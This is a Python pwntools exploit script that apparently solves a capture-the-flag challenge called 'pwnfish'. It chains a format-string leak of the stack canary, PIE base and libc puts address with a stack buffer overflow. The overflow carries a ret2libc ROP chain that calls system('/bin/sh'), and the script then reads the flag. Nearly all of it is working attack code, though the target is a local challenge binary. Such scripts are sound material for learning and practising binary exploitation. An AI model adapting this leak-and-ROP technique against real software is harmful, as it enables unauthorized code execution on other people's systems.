from pwn import *

context.log_level = "debug"

binary = "./build/pwnfish"

elf = context.binary = ELF(binary, checksec=False)

context.terminal = ["cmd.exe", "/c", "start", "wsl.exe"]

gdbscript = """
break *catch_fish+227
c
"""

libc = ELF('libs/libc.so.6', checksec=False)


whitespace_bytes = [
    b'\x20',  # space
    b'\x09',  # horizontal tab
    b'\x0a',  # newline 
    b'\x0b',  # vertical tab
    b'\x0c',  # form feed
    b'\x0d'   # carriage return
]

def menu(io, choice):
    io.sendlineafter(b"> ", f"{choice}".encode())

def catch_fish(io, name):
    menu(io, 1)
    io.sendlineafter(b"Name your new pet: ", name)

def show_fish(io, name):
    menu(io, 2)
    io.sendlineafter(b"Enter name of fish: ", name)

def leak_any(io, payload):
    catch_fish(io, payload)
    show_fish(io, payload)
    io.recvline()
    # return io.recvline()

def leak_pointer(io, i: int):
    catch_fish(io, f"%{i}$p".encode())
    show_fish(io, f"%{i}$p".encode())
    io.recvline()
    return io.recvline()

def contains_whitespace(payload) -> bool:
    for byte in whitespace_bytes:
        if byte in payload:
            return True
    return False

def run():
    elf.address = 0
    libc.address = 0

    p = process(binary)
    # p = gdb.debug(binary, gdbscript)

    # Leak canary
    canary = int(leak_pointer(p, 13), 16)
    info("Canary: %#x", canary)

    # Leak stored rip to compute PIE base address
    # stored rip points to menu+menu_leak_offset
    # found manually using gdb
    menu_leak_offset = 256
    leaked_menu = int(leak_pointer(p, 15), 16) - menu_leak_offset
    info("offset of menu: %#x", elf.functions.menu.address)
    elf.address = leaked_menu - elf.functions.menu.address
    info("leaked address: %#x", leaked_menu)
    info("piebase: %#x", elf.address)

    # Leak puts address from GOT
    info("GOT puts address: %#x", elf.got['puts'])
    puts_address = p64(elf.got['puts'])

    # scanf stops reading on whitespace
    if contains_whitespace(puts_address):
        print("Retrying: Whitespace in puts address")
        return False

    payload = flat(
        b"%9$s".ljust(8, b'A'), # Padded so puts address is aligned for %9$s
        elf.got['puts'],
    )
    leak_any(p, payload)
    leaked_puts = u64(p.recv(6) + b"\x00\x00") # last two null bytes are not read by printf
    info("Leaked puts: %#x", leaked_puts)
    
    # Compute libc base address
    libc.address = leaked_puts - libc.symbols.get('puts')
    info("libc base: %#x", libc.address)
    system = libc.functions.system.address
    info("system address: %#x", system)
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    info("/bin/sh address: %#x", bin_sh)

    rop = ROP(libc, badchars='\n;=')
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
    # ret gadget used to align stack 
    ret_align = rop.find_gadget(['ret']).address

    # NOTE: curr pointer is stored at a lower address (closer to rsp) than name buffer
    # therefore we can safely overwrite the name buffer without
    # messing with the curr pointer,
    # and thus safely make it to the ret instruction for the ROP chain

    # bytes to canary (found with gdb)
    padding_length = 40 # (56 to rip, 40 = 56 - canary - rbp)

    payload = flat(
        b"A" * padding_length,
        canary,
        p64(0), # old rbp, not important
        pop_rdi,
        bin_sh,
        ret_align,
        system,
    )

    if contains_whitespace(payload):
        print("Retrying: Whitespace in payload")
        return False

    # Perform buffer overflow
    show_fish(p, payload)
    p.recvline()

    p.sendline(b"cat flag")
    flag = p.recvline().decode("utf-8").strip()
    print(flag)
    p.close()
    return True

if __name__ == "__main__":
    # May fail if payload happens to contain whitespace
    # Try 20 times, though a couple tries should be enough
    for i in range(20):
        if run():
            print("Status: Success")
            exit(0)

    print("Status: Failed")
    exit(-1)


